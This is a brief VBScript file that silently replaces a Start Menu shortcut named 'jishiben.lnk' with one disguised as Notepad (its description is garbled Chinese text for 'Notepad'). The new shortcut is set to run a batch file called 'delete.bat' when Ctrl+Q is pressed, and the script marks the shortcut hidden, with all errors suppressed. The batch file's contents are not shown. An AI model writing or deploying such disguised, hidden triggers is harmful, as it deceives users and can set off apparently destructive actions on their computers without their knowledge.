on error resume next
set ching  = createobject("wscript.shell")

currentpath = createobject("Scripting.FileSystemObject").GetFolder(".").Path

LinkFile   = ching.specialfolders("startmenu") & "\jishiben.lnk"
TargetFile = currentpath + "\delete.bat"
HotKey     = "Ctrl+Q"
createobject("scripting.filesystemobject").deletefile LinkFile


with ching.createshortcut(LinkFile)
.TargetPath	= TargetFile
.Hotkey		= HotKey
.WindowStyle	= 1
.IconLocation	= TargetFile & ",0"
.Description	= "¼ÇÊÂ±¾"
.WorkingDirectory = ""
.Save
end with


createobject("scripting.filesystemobject").getfile(LinkFile).attributes = 2